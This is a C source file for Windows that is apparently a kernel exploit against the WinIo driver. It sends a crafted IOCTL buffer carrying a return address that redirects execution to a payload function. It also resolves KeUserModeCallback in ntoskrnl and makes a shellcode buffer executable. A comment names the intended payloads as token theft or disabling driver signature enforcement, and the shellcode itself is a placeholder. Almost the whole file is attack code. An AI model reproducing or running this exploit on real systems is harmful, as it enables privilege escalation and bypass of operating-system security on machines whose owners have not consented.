#include<Windows.h>
#include<stdio.h>
#include <intrin.h>
#include"util.h"
#include"PEBhandler.h"

#define FILE_DEVICE_WINIO 0x00008010

// Macro definition for defining IOCTL and FSCTL function control codes.
// Note that function codes 0-2047 are reserved for Microsoft Corporation,
// and 2048-4095 are reserved for customers.

#define WINIO_IOCTL_INDEX 0x810

// Define our own private IOCTL

#define IOCTL_WINIO_MAPPHYSTOLIN     CTL_CODE(FILE_DEVICE_WINIO,  \
	WINIO_IOCTL_INDEX,      \
	METHOD_BUFFERED,        \
	FILE_ANY_ACCESS)


// do what you whant to do :  steal token or disable driver singing enforcement 
char shellcode[]=
{
	'\x90','\xcc','\x90','\x90','\x90','\x90','\x90','\x90','\x90','\x90','\x90','\x90','\x90','c3'
};

typedef NTSTATUS ( *KeUserModeCallback)
	(
    IN ULONG ApiNumber,
    IN PVOID InputBuffer,
    IN ULONG InputLength,
    OUT PVOID *OutputBuffer,
    IN PULONG OutputLength
    );



KeUserModeCallback KeUserModeCallbackPointer;
void Payload()
{

	//add rsp+8
	//#GP if Source or Destination unaligned memory operand

	//this  function allocate  0x38 stack but  we need  0x40 to make  it align
	// i make this  with hex editor but need  other 

	//execuet shellcode :)

	(*(void(*)())(void*)shellcode)();
	installhook();
	KeUserModeCallbackPointer(0,0,0,0,0);
}



void main()
{
	HANDLE hDriver ;
	DWORD dwBytesReturned;
	CHAR ShellcodeFakeMemory[56+8]={0};// last 8 byte  is  for return address 
	DWORD oldpt;

	LoadLibrary("user32.dll");
	KeUserModeCallbackPointer=(KeUserModeCallback)GetKernelProcAddress("ntoskrnl.exe","KeUserModeCallback");
	printf("addrees of %p KeUserModeCallback is ",KeUserModeCallbackPointer);
	

	
	 int*  pointer=(int*)Payload;
	 if(!VirtualProtect(shellcode,strlen(shellcode),PAGE_EXECUTE_READWRITE,&oldpt))
	 {
		  fprintf(stderr,"send IOCTL error %d.\n",GetLastError());
		  return;
	 }



	  memcpy(ShellcodeFakeMemory+56,&pointer,sizeof(int*));
	
	  FackDispatchTable();
	 


	hDriver = CreateFileA("\\\\.\\WinIo",GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
  if(hDriver!=INVALID_HANDLE_VALUE)
  {
	   fprintf(stderr," Open Driver OK\n");

	  if (!DeviceIoControl(hDriver, IOCTL_WINIO_MAPPHYSTOLIN, &ShellcodeFakeMemory,sizeof(ShellcodeFakeMemory),NULL,NULL,&dwBytesReturned, NULL))
	  {
		  fprintf(stderr,"send IOCTL error %d.\n",GetLastError());
		  return;
	  }
	  else  fprintf(stderr," Send IOCTL OK\n");
  }

  else 
  {
	  fprintf(stderr," Open Driver error %d.\n",GetLastError());
	  return;
  }

}